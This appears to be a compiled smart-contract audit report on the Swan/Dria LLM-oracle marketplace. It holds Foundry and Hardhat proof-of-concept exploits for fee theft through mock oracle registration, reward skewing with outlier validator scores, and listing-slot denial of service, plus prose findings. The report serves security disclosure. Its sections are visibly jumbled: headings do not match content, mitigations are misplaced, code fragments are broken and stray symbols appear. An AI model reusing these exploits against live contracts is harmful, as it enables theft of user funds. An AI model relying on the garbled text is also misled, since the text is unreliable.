# Denial-of-Service (DoS) via Asset Listing

**Severity:** high
**Auditor:** CodeHawks
**Protocol:** Swan
**Keywords:** DoS, asset listing, malicious, price, ERC20, minimum value, Swan, buyer, maxAssetCount, exploit, monopolize, market, fees, protocol, performance, transfer, royalties, relist, SwanAsset, buyerAgent

---

# Vulnerability Description

Swan swan;
uint256 maxAssetCount = 5;
uint256 withdrawInterval = 30 minutes;
uint256 sellInterval = 60 minutes;
uint256 buyInterval = 20 minutes;
uint256 numGenerations = 5;
uint256 numValidations = 5;
uint256 generatorStakeAmount = 100 ether;
uint256 validatorStakeAmount = 100 ether;
uint8 difficulty = 10;
uint256 generationFee = 0.02 ether;
uint256 validationFee = 0.03 ether;

\u0060\u0060\u0060solidity
function setUp() public {
    // Buyer Agent Factory setup
    buyerAgentFactory = address(new BuyerAgentFactory());
    // Swan Asset Factory setup
    swanAssetFactory = address(new SwanAssetFactory());
    // dria token setup
    dria = IERC20(new MockERC20("dria", "dria"));
    // Oracle Registry setup
    address impl = address(new LLMOracleRegistry());
    bytes memory data =
        abi.encodeCall(LLMOracleRegistry.initialize, (generatorStakeAmount, validatorStakeAmount,
         address(dria)));
    address proxy = address(new ERC1967Proxy(impl, data));
    registry = LLMOracleRegistry(proxy);
    // Oracle Coordination setup
    impl = address(new LLMOracleCoordinator());
    uint256 platformFee = 1;
    data = abi.encodeCall(
        LLMOracleCoordinator.initialize,
        (address(registry), address(dria), platformFee, generationFee, validationFee)
    );
    proxy = address(new ERC1967Proxy(impl, data));
    coordinator = LLMOracleCoordinator(proxy);
    // swan setup
    impl = address(new Swan());
    LLMOracleTaskParameters memory llmParams = LLMOracleTaskParameters({
        difficulty: difficulty,
        numGenerations: uint40(numGenerations),
        numValidations: uint40(numValidations)
    });
    SwanMarketParameters memory swanParams = SwanMarketParameters({
        withdrawInterval: withdrawInterval,
        sellInterval: sellInterval,
        buyInterval: buyInterval,
        platformFee: 1,
        maxAssetCount: maxAssetCount,
        timestamp: 0
    });
    data = abi.encodeCall(
        Swan.initialize,
        (swanParams, llmParams, address(coordinator), address(dria), buyerAgentFactory,
         swanAssetFactory)
\u0060\u0060\u0060
## Vulnerability Report

\u0060\u0060\u0060solidity
                     proxy = address(new ERC1967Proxy(impl, data));
                     swan = Swan(proxy);
                 }
                 function test_PoC() public {
                     address buyer = makeAddr("buyer");
                     // #### User creating a purchase request ###
                     uint96 feeRoyalty = 1;
                     uint256 amountPerRound = 0.1 ether;
                     vm.startPrank(buyer);
                     // buyer setting up his agent
                     BuyerAgent agent = swan.createBuyer("agent/1.0", "Testing agent", feeRoyalty, amountPerRound);
                     // skip sell phase, get into buy phase
                     vm.warp(block.timestamp + sellInterval + 1);
                     // airdrop fees to agent for the request
                     (uint256 totalFee,,) = coordinator.getFee(agent.swan().getOracleParameters());
                     deal(address(dria), address(agent), totalFee);
                     // buyer calling oracle purchase request, to "ask" oracles to submit responds
                     bytes memory input = bytes("test input");
                     agent.oraclePurchaseRequest(input, bytes("test models"));
                     vm.stopPrank();
                     // #### Attacker submitting mock responds to get fees ###
                     address attacker = makeAddr("attacker");
                     // airdroping the initial stake amount for an address to register as an oracle
                     deal(address(dria), attacker, generatorStakeAmount);
                     // attacker transfers the stake amount to the first mockGenerator
                     vm.prank(attacker);
                     dria.transfer(
                         makeAddr(string(abi.encodePacked("mockGenerator", vm.toString(uint256(0))))),
                          ✱✦ generatorStakeAmount
                     );
                     // attacker mocks multiple responds
                     for (uint256 i = 0; i < numGenerations; i++) {
                         address mockGenerator = makeAddr(string(abi.encodePacked("mockGenerator", vm.toString(i))));
                         // register the mockGenerator as generator
                         vm.startPrank(mockGenerator);
                         dria.approve(address(registry), generatorStakeAmount);
                         registry.register(LLMOracleKind.Generator);
                         vm.stopPrank();
                         // mockGenerator submits a random response to get the respond fee
                         vm.startPrank(mockGenerator);
                         coordinator.respond(
                             1,
                             getValidNonce(1, input, address(agent), mockGenerator),
                             bytes("Random output"),
                             bytes("Random metadata")
                         );
                         vm.stopPrank();
                         // unregister the mockGenerator and get the stake amount
\u0060\u0060\u0060
## Attacker Mocks Multiple Validations
\u0060\u0060\u0060solidity
vm.prank(mockGenerator);
registry.unregister(LLMOracleKind.Generator);
if (i == numGenerations - 1) {
    // if it\u0027s the last iteration, send the stake amount to the first mockGenerator
    address firstMockValidator =
         makeAddr(string(abi.encodePacked("mockValidator", vm.toString(uint256(0)))));
    vm.prank(mockGenerator);
    dria.transferFrom(address(registry), firstMockValidator, generatorStakeAmount);
} else {
    // if it\u0027s not the last iteration, send the stake amount to the next mockGenerator
    address nextMockGenerator = makeAddr(string(abi.encodePacked("mockGenerator",
     vm.toString(i + 1))));
    vm.prank(mockGenerator);
    dria.transferFrom(address(registry), nextMockGenerator, generatorStakeAmount);
}

// attacker mocks multiple validations
for (uint256 i = 0; i < numValidations; i++) {
    address mockValidator = makeAddr(string(abi.encodePacked("mockValidator", vm.toString(i))));
    // register the mockValidator as validator
    vm.startPrank(mockValidator);
    dria.approve(address(registry), validatorStakeAmount);
    registry.register(LLMOracleKind.Validator);
    vm.stopPrank();
    // mockValidator submits random scores to get the validation fee
    vm.startPrank(mockValidator);
    uint256[] memory scores = new uint256[]();
    coordinator.validate(
        1, getValidNonce(1, input, address(agent), mockValidator), scores, bytes("Random metadata")
    );
    vm.stopPrank();
    // unregister the mockValidator and get the stake amount
    vm.prank(mockValidator);
    registry.unregister(LLMOracleKind.Validator);
    if (i == numValidations - 1) {
        // if it\u0027s the last iteration, send the stake amount to the attacker
        vm.prank(mockValidator);
        dria.transferFrom(address(registry), attacker, validatorStakeAmount);
    } else {
        // if it\u0027s not the last iteration, send the stake amount to the next mockValidator
        address nextMockValidator = makeAddr(string(abi.encodePacked("mockValidator",
         vm.toString(i + 1))));
        vm.prank(mockValidator);
        dria.transferFrom(address(registry), nextMockValidator, validatorStakeAmount);
    }
}

// attacker gathering all funds
for (uint256 i = 0; i < numGenerations; i++) {
    address mockGenerator = makeAddr(string(abi.encodePacked("mockGenerator", vm.toString(i))));
    // mockGenerator sends his generationFee to the attacker
    vm.startPrank(mockGenerator);
    dria.transferFrom(address(coordinator), attacker, dria.allowance(address(coordinator),
     mockGenerator));
\u0060\u0060\u0060
## M-03. Unrestricted validation score range for validators in LLMOracleCoordinator::validate

**Submitted by:** aksoy, Sickurity, safdie, 0xtheblackpanther, 0xbeastboy, 0xrolko, gaurav11018, skid0016, danzero, 0xnbvc, anonymousjoe, pyro, zxriptor, saurabh_singh, 0xdemon, tejaswarambhe, drynooo, v1vah0us3, aestheticbhai, abhishekthakur, goran, Gladiators, m4k2xmk, alqaqa, waydou, j1v9, emmanuel, y0ng0p3. **Selected submission by:** v1vah0us3.

The validate functions lack restrictions on the range of scores that validators can submit. This omission allows validators to submit arbitrary scores, which can disproportionately skew mean and standard deviation calculations. As a result, reward distributions can become biased, disproportionately benefiting validators who submit outlier scores.

Within the validate function, validators can submit an array of scores without any restriction on maximum allowable values. These scores are then used to compute mean and standard deviation values using \u0060Statistics.stddev\u0060 in the \u0060finalizeValidation\u0060 function. In the next step the "inner mean" is calculated by including only scores within one standard deviation of the mean, rewarding validators who fall within this range, see [https://github.com/madeupnamefinance/2024-10-swan-dria/blob/main/contracts/llm/LLMOracleCoordinator.sol#L343-L348].

Manual Review, Foundry

### Recommended Mitigation
Introduce a locking mechanism that will prohibit validators and generators from unregistering while a request they responded/validated hasn\u0027t been finalized. Furthermore, the generators/validators of the LLMOracleRegistry could be registered by a whitelist. Finally, a long-term solution would be to introduce a slashing mechanism for misbehaving generators/validators.
## Without a maximum score constraint, the validation process is susceptible to skewed statistics due to outlier scores.
Validators submitting extremely high values can inflate both the mean and standard deviation, affecting the inner mean calculations and global threshold. This bias risks excluding validators with normal scores from rewards and creates potential for reward distribution manipulation.

Within finalizeValidation, this section performs the filtering based on mean and stddev:

\u0060\u0060\u0060solidity
for (uint256 v_i = 0; v_i < task.parameters.numValidations; ++v_i) {
    uint256 score = scores[v_i];
    if ((score >= _mean - _stddev) && (score <= _mean + _stddev)) {
        innerSum += score;
        innerCount++;
        _increaseAllowance(validations[taskId][v_i].validator, task.validatorFee);
    }
}
\u0060\u0060\u0060

This code block only includes scores that are within one standard deviation of the mean (_mean ± _stddev) to participate in the "inner mean" calculation. This can result in valid scores being excluded and validators not receiving a validator fee.

### Exploit Scenario
Suppose a subset of validators submits arbitrarily high scores, for instance, in the range of 100 to 150, while the majority of validators submit scores in a "normal" range, like 0 to 5. The presence of high scores inflates both _mean and _stddev. For example, let\u0027s assume that scores[] array in LLMOracleCoordinator::finalizeValidation (see [https://github.com/madeupnamefinance/2024-10-swan-dria/blob/main/contracts/llm/LLMOracleCoordinator.sol#L331]) contains 5 values, e.g. [130, 3, 140, 4, 120]. Introducing arbitrarily high scores will drive up the _mean significantly. The _stddev will similarly increase, reflecting the variance introduced by these high values. For the given array values [130, 3, 140, 4, 120], both _mean and _stddev can be quickly calculated using the fixed version of the Statistics library in Remix. Here are the results:

decoded input
\u0060\u0060\u0060json
{
    "uint256[] data": [
        "130",
        "3",
        "140",
        "4",
        "120"
    ]
}
\u0060\u0060\u0060

decoded output
\u0060\u0060\u0060json
{
    "0": "uint256: ans 62",
    "1": "uint256: mean 79"
}
\u0060\u0060\u0060

This example illustrates that due to the inflated _mean and _stddev, the range (_mean - _stddev) && (_mean + _stddev) no longer covers the lower "normal" scores (like those in the range 0-5). This would mean that only scores closer to the inflated mean would satisfy the condition (score >= _mean - _stddev) && (score <= _mean + _stddev). As a result, validators with normal scores (0-5) are effectively excluded from validator rewards because their scores fall outside the newly skewed range. This behavior enables "dishonest" validators to effectively eliminate the competition, resulting in only the inflated scores being rewarded.

For the proof of concept we will stick to the score values, similar to those in LLMOracleCoordinator.test.ts. Here is the test case and setup, please paste it into the LLMOracleCoordinator.test.ts file and adjust the this.beforeAll(async function ()) section with additional validators, like this:

\u0060\u0060\u0060javascript
// Add validators to the setUp
this.beforeAll(async function () {
\u0060\u0060\u0060
## Assign Roles
\u0060\u0060\u0060javascript
// assign roles, full = oracle that can do both generation & validation
const [deployer, dum, req1, gen1, gen2, gen3, gen4, gen5, val1, val2, val3, val4, val5] = await ethers.getSigners();
dria = deployer;
requester = req1;
dummy = dum;
generators = [gen1, gen2, gen3, gen4, gen5];
validators = [val1, val2, val3, val4, val5];
\u0060\u0060\u0060

## Test Unfair Reward Distribution
\u0060\u0060\u0060javascript
describe("reward distribution", function () {
    const [numGenerations, numValidations] = [1, 5];
    const scores = [
        parseEther("100"), // high score
        parseEther("0.8"),
        parseEther("120"), // high score
        parseEther("0.4"),
        parseEther("120") // high score
    ];
    let generatorAllowancesBefore: bigint[];
    let validatorAllowancesBefore: bigint[];
    this.beforeAll(async () => {
        taskId++;
        generatorAllowancesBefore = await Promise.all(
            generators.map((g) => token.allowance(coordinatorAddress, g.address))
        );
        validatorAllowancesBefore = await Promise.all(
            validators.map((v) => token.allowance(coordinatorAddress, v.address))
        );
    });
    it("should make a request", async function () {
        await safeRequest(coordinator, token, requester, taskId, input, models, {
            difficulty,
            numGenerations,
            numValidations,
        });
    });
    it("should respond to each generation", async function () {
        const availableGenerators = generators.length;
        const generationsToRespond = Math.min(numGenerations, availableGenerators);
        expect(availableGenerators).to.be.at.least(generationsToRespond);
        for (let i = 0; i < generationsToRespond; i++) {
            await safeRespond(coordinator, generators[i], output, metadata, taskId, BigInt(i));
        }
    });
    it("should validate with varied scores, finalize validation, and distribute rewards correctly", async function () {
        const requestBefore = await coordinator.requests(taskId);
        console.log(\u0060Request status before validation: ${requestBefore.status}\u0060);
\u0060\u0060\u0060
## Code Analysis

\u0060\u0060\u0060javascript
// Check the initial status to ensure the task is ready for validation
const initialStatus = BigInt(TaskStatus.PendingValidation);
expect(requestBefore.status).to.equal(initialStatus, "Task is not in PendingValidation state ✱✦ initially.");
for (let i = 0; i < numValidations; i++) {
    console.log(\u0060Validating with validator at index ${i} with address: ${validators[i].address}\u0060);
    console.log(\u0060Score being used: ${scores[i].toString()}, Task ID: ${taskId}\u0060);
    const currentStatus = BigInt((await coordinator.requests(taskId)).status);
    if (currentStatus !== initialStatus) {
        console.error(\u0060Aborting: Unexpected task status ${currentStatus} before validation at ✱✦ index ${i}\u0060);
        break;
    }
    try {
        await safeValidate(coordinator, validators[i], [scores[i]], metadata, taskId, BigInt(i));
        console.log(\u0060Validation succeeded for validator at index ${i}\u0060);
    } catch (error: any) {
        console.error(\u0060Validation failed for validator at index ${i}: ${error.message}\u0060);
    }
}

// Final status check to confirm the task is completed
const finalRequest = await coordinator.requests(taskId);
console.log(\u0060Request status after all validations: ${finalRequest.status}\u0060);
expect(finalRequest.status).to.equal(BigInt(TaskStatus.Completed), "Task did not reach Completed ✱✦ status after all validations");

// Check validators\u0027 reward allowances after validations
const validatorAllowancesAfter = await Promise.all(
    validators.map((v) => token.allowance(coordinatorAddress, v.address))
);

// Expected outcome: validators 0, 2, 4 receive rewards, 1 and 3 do not
const expectedRewards = [0, 2, 4]; // Indices expected to have rewards
const noRewardValidators = [1, 3]; // Indices expected not to receive rewards
for (let i = 0; i < numValidations; i++) {
    const rewardDifference = validatorAllowancesAfter[i] - validatorAllowancesBefore[i];
    console.log(\u0060Validator ${i} reward: ${rewardDifference.toString()}\u0060);
    if (expectedRewards.includes(i)) {
        // These validators should receive a reward
        expect(rewardDifference).to.be.gt(0n, \u0060Validator ${i} was expected to receive a reward but ✱✦ got none\u0060);
        console.log(\u0060Validator ${i} received reward as expected.\u0060);
    } else if (noRewardValidators.includes(i)) {
        // These validators should not receive a reward
        expect(rewardDifference).to.equal(0n, \u0060Validator ${i} was not expected to receive a reward ✱✦ but did\u0060);
        console.log(\u0060Validator ${i} correctly received no reward.\u0060);
    }
}
\u0060\u0060\u0060

The test can be run with \u0060yarn test ./test/LLMOracleCoordinator.test.ts\u0060. Here are the logs:
Validator 0 reward: 2400000000000000
Validator 0 received reward as expected.  
Validator 1 reward: 0  
Validator 1 correctly received no reward.  
Validator 2 reward: 2400000000000000  
Validator 2 received reward as expected.  
Validator 3 reward: 0  
Validator 3 correctly received no reward.  
Validator 4 reward: 2400000000000000  
Validator 4 received reward as expected.  

As you can see from the error logs, the validators with scores of 0.8 and 0.4 didn\u0027t get the rewards because they used a different scoring range than the other 3 validators.  

Validators submitting outlier scores (e.g., in the range of 100±200) can disproportionately influence the validation mean and standard deviation, skewing the calculated range for validator reward eligibility. As a result, other, more representative scores (e.g., in the range of 0±5) are excluded from validator rewards. This manipulation can lead to honest validators being unfairly denied rewards.  

Manual review, Remix, Hardhat  

To prevent manipulation through extreme score outliers, consider introducing a configurable \u0060maxScore\u0060 parameter within the \u0060TaskRequest\u0060 or \u0060TaskResponse\u0060 struct to enforce a maximum allowable score range. By setting a limit, validators\u0027 scores are restricted to a reasonable threshold, preventing inflated values from disproportionately affecting the mean and standard deviation calculations. This parameter should be checked within the \u0060validate\u0060 function to ensure all scores stay within the acceptable range.  

\u0060\u0060\u0060solidity
// Place this custom error at the top of the \u0060LLMOracleCoordinator.sol\u0060 contract:
error ScoreOutOfRange(uint256 taskId, uint256 providedScore, uint256 maxScore);
\u0060\u0060\u0060

\u0060\u0060\u0060solidity
function validate(uint256 taskId, uint256 nonce, uint256[] calldata scores, bytes calldata metadata)
    public
    onlyRegistered(LLMOracleKind.Validator)
    onlyAtStatus(taskId, TaskStatus.PendingValidation)
{
    TaskRequest storage task = requests[taskId];
    // ensure there is a score for each generation
    if (scores.length != task.parameters.numGenerations) {
        revert InvalidValidation(taskId, msg.sender);
    }
    uint256 maxScore = task.maxScore;
    for (uint256 i = 0; i < scores.length; i++) {
        if (scores[i] > maxScore) {
            revert ScoreOutOfRange(taskId, scores[i], maxScore);
        }
    }
}
\u0060\u0060\u0060
**Submitted by:** Sickurity, aksoy, foxb868, heavenz52, 0xbrett8571, safdie, ljj, auditweiler, mangocola, kodyvim, ericselvig, ChainDefenders, neilalois, helium, dimulski, mohammadx2049, 0xdemon, Valin Security Group, aestheticbhai, jiri123, pyro, anonymousjoe, sovaslava, kunwarsiddarths, galturok, 0xw3, merlin, 0xhals, tychaios, shui, theirrationalone, tejaswarambhe, unique0x0, 0xhacksmithh, falsegenius, Gladiators, carrotsmuggler, 0rpseqwe, emmanuel, johny7173, m4k2xmk, j1v9, 10ap17. **Selected submission by:** theirrationalone.

In \u0060Swan.sol\u0060, the \u0060list\u0060 function allows users to create new assets with various parameters, including a price parameter that lacks a minimum value constraint. As a result, users can set any ERC20-compatible token (e.g., ETH, WETH) as the price, potentially even using extremely low values. Since some tokens may require a minimum value, users could set the price to a value of 1 rather than the standard ERC20 unit (1e18). Thus, the smallest amount greater than zero is used, bypassing intended costs.
## Swan::list function:
\u0060\u0060\u0060solidity
function list(string calldata _name, string calldata _symbol, bytes calldata _desc, uint256 _price,
              address _buyer)
    external
{
    // @info: Missing minimum price check.
    BuyerAgent buyer = BuyerAgent(_buyer);
    (uint256 round, BuyerAgent.Phase phase,) = buyer.getRoundPhase();
    // Ensure the buyer is in the sell phase
    if (phase != BuyerAgent.Phase.Sell) {
        revert BuyerAgent.InvalidPhase(phase, BuyerAgent.Phase.Sell);
    }
    // Ensure asset count does not exceed \u0060maxAssetCount\u0060
    if (getCurrentMarketParameters().maxAssetCount == assetsPerBuyerRound[_buyer][round].length) {
        revert AssetLimitExceeded(getCurrentMarketParameters().maxAssetCount);
    }
    // All checks pass, create the asset and its listing
    address asset = address(swanAssetFactory.deploy(_name, _symbol, _desc, msg.sender));
    listings[asset] = AssetListing({
        createdAt: block.timestamp,
        royaltyFee: buyer.royaltyFee(),
        price: _price,
        seller: msg.sender,
        status: AssetStatus.Listed,
        buyer: _buyer,
        round: round
    });
    // Add listing to buyer’s list of assets for the round
    assetsPerBuyerRound[_buyer][round].push(asset);
    // Transfer royalties
    transferRoyalties(listings[asset]);
    emit AssetListed(msg.sender, asset, _price);
}
\u0060\u0060\u0060

### Swan::relist function:
\u0060\u0060\u0060solidity
function relist(address _asset, address _buyer, uint256 _price) external {
    // @info: missing zero price check
    AssetListing storage asset = listings[_asset];
}
\u0060\u0060\u0060
\u0060\u0060\u0060solidity
// only the seller can relist the asset
if (asset.seller != msg.sender) {
    revert Unauthorized(msg.sender);
}
// asset must be listed
if (asset.status != AssetStatus.Listed) {
    revert InvalidStatus(asset.status, AssetStatus.Listed);
}
// relist can only happen after the round of its listing has ended
// we check this via the old buyer, that is the existing asset.buyer
// @info: invalid natspec below
// note that asset is unlisted here, but is not bought at all
//
// perhaps it suffices to check \u0060==\u0060 here, since buyer round
// is changed incrementially
(uint256 oldRound,,) = BuyerAgent(asset.buyer).getRoundPhase();
if (oldRound <= asset.round) {
    revert RoundNotFinished(_asset, asset.round);
}
// now we move on to the new buyer
BuyerAgent buyer = BuyerAgent(_buyer);
(uint256 round, BuyerAgent.Phase phase,) = buyer.getRoundPhase();
// buyer must be in sell phase
if (phase != BuyerAgent.Phase.Sell) {
    revert BuyerAgent.InvalidPhase(phase, BuyerAgent.Phase.Sell);
}
// buyer must not have more than \u0060maxAssetCount\u0060 many assets
uint256 count = assetsPerBuyerRound[_buyer][round].length;
if (count >= getCurrentMarketParameters().maxAssetCount) {
    revert AssetLimitExceeded(count);
}
// create listing
listings[_asset] = AssetListing({
    createdAt: block.timestamp,
    royaltyFee: buyer.royaltyFee(),
    price: _price,
    seller: msg.sender,
    status: AssetStatus.Listed,
    buyer: _buyer,
    round: round
});
// add this to list of listings for the buyer for this round
assetsPerBuyerRound[_buyer][round].push(_asset);
// transfer royalties
transferRoyalties(listings[_asset]);
emit AssetRelisted(msg.sender, _buyer, _asset, _price);
\u0060\u0060\u0060

DuetopreviouslydiscoveredfindingsontransferRoyaltiesbyLightchaser,checksagainstzeroamountsoffees help protect some price values, but this doesn’t fully mitigate the issue.
## Denial-of-Service (DoS) via Asset Listing

Malicious users can exploit the list function by setting the price to the minimum possible amount (e.g., 1 or 10) instead of the expected ERC20 unit (1e18 or 10e18). This enables bad actors to list multiple assets at virtually no cost, creating a denial-of-service (DoS) situation. Since the market parameters, including round, roundTime, and phase, evolve with each listing, a malicious actor could monopolize a specific round by populating the list with their assets. Once the maxAssetCount is reached for that round, others would be unable to list new assets until the next parameter update. This exploitation can be repeated every round, impacting any buyer’s listings.

### Relevant Swan::list function code:
\u0060\u0060\u0060solidity
// Ensure asset count does not exceed \u0060maxAssetCount\u0060
if (getCurrentMarketParameters().maxAssetCount == assetsPerBuyerRound[_buyer][round].length) {
    revert AssetLimitExceeded(getCurrentMarketParameters().maxAssetCount);
}
\u0060\u0060\u0060

### Relevant Swan::relist function code:
\u0060\u0060\u0060solidity
// Ensure asset count does not exceed \u0060maxAssetCount\u0060
uint256 count = assetsPerBuyerRound[_buyer][round].length;
if (count >= getCurrentMarketParameters().maxAssetCount) {
    revert AssetLimitExceeded(count);
}
\u0060\u0060\u0060

1. Add the following test code to Swan.test.ts within the Swan test suite:
\u0060\u0060\u0060javascript
describe("Swan Attack Mode", async () => {
    const currRound = 0n;
    it("should list 5 assets for the first round", async function () {
        await listAssets(
            swan,
            buyerAgent,
            [
                [seller, PRICE1],
                [seller, PRICE2],
                [seller, PRICE3],
                [sellerToRelist, PRICE2],
                [sellerToRelist, PRICE1],
            ],
            NAME,
            SYMBOL,
            DESC,
            0n
        );
        [assetToBuy, assetToRelist, assetToFail, ,] = await swan.getListedAssets(
            await buyerAgent.getAddress(),
            currRound
        );
        expect(await token.balanceOf(seller)).to.be.equal(FEE_AMOUNT1 + FEE_AMOUNT2);
        expect(await token.balanceOf(sellerToRelist)).to.be.equal(0);
    });
    it("should NOT allow listing more than max asset count", async function () {
        // Try to list an asset beyond the max asset count
        await expect(swan.connect(sellerToRelist).list(NAME, SYMBOL, DESC, PRICE1, await buyerAgent.getAddress()))
            .to.be.revertedWithCustomError(swan, "AssetLimitExceeded")
            .withArgs(MARKET_PARAMETERS.maxAssetCount);
    });
});
\u0060\u0060\u0060
## Vulnerabilities

### Assets can be listed with a minimal price of 1 unit

\u0060\u0060\u0060javascript
it("Assets can be listed with a minimal price of 1 unit", async () => {
    let NEW_MARKET_PARAMETERS = {
        withdrawInterval: minutes(10),
        sellInterval: minutes(20),
        buyInterval: minutes(30),
        platformFee: 2n,
        maxAssetCount: 2n,
        timestamp: (await ethers.provider.getBlock("latest").then((block) => block?.timestamp)) as bigint,
    };
    await swan.connect(dria).setMarketParameters(NEW_MARKET_PARAMETERS);
    const PRICE = 1;    // Minimal unit
    // First asset listing in the same round
    await swan.connect(seller).list(NAME, SYMBOL, DESC, PRICE, await buyerAgent.getAddress());
    // Second asset listing in the same round
    await swan.connect(seller).list(NAME, SYMBOL, DESC, PRICE, await buyerAgent.getAddress());
    // Third asset listing should revert due to max count
    await expect(swan.connect(seller).list(NAME, SYMBOL, DESC, PRICE, await buyerAgent.getAddress())).to.be.revertedWithCustomError(swan, "AssetLimitExceeded");
});
\u0060\u0060\u0060

1. Comment out all test cases following Sell phase #1: listing inclusively.
2. Run the following command to test:
   \u0060\u0060\u0060bash
   yarn test --grep "Swan"
   \u0060\u0060\u0060
3. Check logs for gas usage results.

- Malicious actors can fill listings with their own assets until the maxAssetCount is reached, causing other users to experience a DoS.
- This DoS can be performed with minimal cost of only 1 or 10 greater than zero not 1e18 or 10e18 just 1 or 10. whose 100% is still greater than 0. So fees will not be zero.
- Low-cost asset creation risks overwhelming the protocol with a flood of assets, which could affect protocol performance.

1. Implement a check that verifies the price value is non-zero and considers ERC20 precision (e.g., 18 decimals).
2. Enforce a minimum listing price, potentially at least 1% of the ERC20 unit. For a "Free Asset Creation" feature, include logic to prevent spam and Sybil attacks if zero fees are allowed.
## Submitted by 
ChainDefenders, gaurav11018, emmanuel, alqaqa, waydou, sovaslava. Selected submission by: alqaqa.

BuyerAgent can make two requests either purchase request or StateUpdate request. First, he should make a \u0060BuyerAgent::oraclePurchaseRequest()\u0060 request to buy all the items he needs, then call \u0060BuyerAgent::purchase()\u0060 after his task gets completed by Oracle coordinator to buy the items he wants. Then, in case of buying new items success he should make \u0060BuyerAgent::oracleStateRequest()\u0060 to update his state after buying items, then call \u0060BuyerAgent::updateState()\u0060 to change his state.

The problem here is that there is no check when \u0060BuyerAgent::oraclePurchaseRequest()\u0060 or \u0060BuyerAgent::oracleStateRequest()\u0060 get requested. There is just a check that enforces firing both of them on a given Phase. We will explain the problem in the purchasing process, but it also existed in updating the state process.

When requesting to purchase items, we check that we are at a Round that is at Buy Phase, and when doing the actual purchase the Round should be the same as the Round we call \u0060BuyerAgent::oraclePurchaseRequest()\u0060 as well as the phase should be Buy.

\u0060\u0060\u0060solidity
function oraclePurchaseRequest(bytes calldata _input, bytes calldata _models) external
    onlyAuthorized {
    // check that we are in the Buy phase, and return round
    (uint256 round,) = _checkRoundPhase(Phase.Buy);
    oraclePurchaseRequests[round] =
        swan.coordinator().request(SwanBuyerPurchaseOracleProtocol, _input, _models,
        swan.getOracleParameters());
}
\u0060\u0060\u0060

\u0060\u0060\u0060solidity
function purchase() external onlyAuthorized {
    // check that we are in the Buy phase, and return round
    (uint256 round,) = _checkRoundPhase(Phase.Buy);
    // check if the task is already processed
    uint256 taskId = oraclePurchaseRequests[round];
    if (isOracleRequestProcessed[taskId]) {
        revert TaskAlreadyProcessed();
    }
}
\u0060\u0060\u0060

For \u0060BuyerAgent::purchase()\u0060 to process, we should be at the same Round as well as at the Phase, which is Buy in that example, when we fired \u0060BuyerAgent::oraclePurchaseRequest()\u0060. The flow is as follows:
1. \u0060BuyerAgent::oraclePurchaseRequest()\u0060
2. Generators will generate output in LLM Coordinator
3. Validators will validate in LLM Coordinator
4. Task marked as completed
5. \u0060BuyerAgent::purchase()\u0060

There is time will be taken for generators and validators to make the output (complete the task). So if \u0060BuyerAgent::oraclePurchaseRequest\u0060 gets fired before the end of Buying Phase with little time, this will make the Buy ends and enters Withdraw phase before Generators and Validators complete that task, resulting in losing Fees paid by the BuyerAgent when requesting the purchase request.
- BuyerAgent wants to buy a given item
- His Round is 10 and we are at the Buy phase now
- The buying phase is about to end there is just one Hour left
- BuyerAgent Fired BuyerAgent::oraclePurchaseRequest()
- Fees got paid and we are waiting for the task to complete
- Generators and Validators took 6 Hours to complete this task
- Now, the BuyerAgent Round is 10 and the Phase is Withdraw
- calling BuyerAgent::purchase() will fail as we are not in the Buy Phase

The problem is that there is no time left for requesting and firing, if the request occurs at the end of the Phase, finalizing the request either purchase or update state will fail, as the phase will end. We are doing Oracle and off-chain computations for the given task, and the time to finalize (complete) a task differs from one task to another according to difficulty.

There are three things here that make this problem occur.
1. If the Operator is not active, the BuyerAgent should call the request himself.
2. If Completing the Task process takes too much time, this can occur for Tasks that require a lot of validations, or difficulty is high.
3. If there is a High Demand for a given request the Operator may finalize some of them at the end.

Don\u0027t allow requests for all the phase ranges. For example, in case we have 7 days for the Buy phase, we should stop requesting purchase requests at the end of 2 days to not make requests occur at the last period of the phase resulting in an insolvable state if it gets completed after 2 days. This is just an example. The period to stop requests should be determined according to the task itself (number of Generators/Validators needed and its difficulty).

Submitted by Sickurity, heavenz52, aksoy, ljj, robertodf99, zxriptor, jiri123, iampukar, elser17, sovaslava, merlin, mohammadx2049, 0xhals, pelz, tychaios, pyro, tigerfrake, icebear, ericselvig, abhishekthakur, emmanuel, j1v9, inh3l. Selected submission by: mohammadx2049.
## BuyerAgent Batch Purchase Failure Due to Asset Transfer or Approval Revocation
The vulnerability allows a malicious seller to disrupt the purchase process of the BuyerAgent contract. This occurs when an asset that is supposed to be bought by the BuyerAgent is either transferred away or has its approval revoked, causing the entire batch purchase transaction to fail. As a result, the BuyerAgent becomes unable to complete the intended purchase of other assets, leading to a Denial of Service (DoS) scenario.

The vulnerability stems from the flow involving the BuyerAgent\u0027s interaction with the Swan contract for purchasing assets. The BuyerAgent first sends an oraclePurchaseRequest to gather the list of assets to be purchased, which is determined by an external oracle. Once the purchase list is available, the user calls BuyerAgent::purchase to buy the assets. During this phase, the BuyerAgent invokes Swan::purchase for each asset in the purchase list. 

[BuyerAgent.sol](https://github.com/madeupnamefinance/2024-10-swan-dria/blob/main/contracts/swan/BuyerAgent.sol?plain=1#L237-L252)

Each asset listed for purchase creates an ERC721 token, where the seller is the owner of the respective tokenId.

[SwanAsset.sol](https://github.com/madeupnamefinance/2024-10-swan-dria/blob/main/contracts/swan/SwanAsset.sol?plain=1#L20-L43)
The vulnerability is exposed when one of the ERC721 assets in the purchase list is transferred away from the seller to another user, or when the seller revokes the approval for Swan. Since the Swan contract requires the ownership of the asset to remain unchanged and the asset\u0027s approval to remain valid, the transfer or revocation leads to the failure of the Swan::purchase call. [Link to Code](https://github.com/madeupnamefinance/2024-10-swan-dria/blob/main/contracts/swan/Swan.sol?plain=1#L294) Consequently, this failure causes BuyerAgent::purchase to revert, preventing the purchase of other assets listed in the transaction.
